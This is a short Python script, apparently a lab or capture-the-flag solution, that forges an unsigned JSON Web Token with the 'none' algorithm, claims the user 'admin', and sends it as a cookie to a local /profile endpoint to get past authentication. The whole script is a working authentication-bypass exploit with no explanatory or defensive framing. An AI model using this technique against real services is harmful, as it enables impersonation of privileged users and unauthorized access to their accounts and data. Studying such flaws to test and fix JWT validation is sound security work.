import requests
import jwt
import time

url = 'http://127.0.0.1:8888/profile'

data_payload = {
    "user_name": 'admin',
    "exp": int(time.time()) + 3600
}

token = jwt.encode(data_payload, None, algorithm=None)
print("token", token)

session = f'Authorization={token}'
print("session", session)

response = requests.get(url, headers={"Cookie": session })

print(response.text)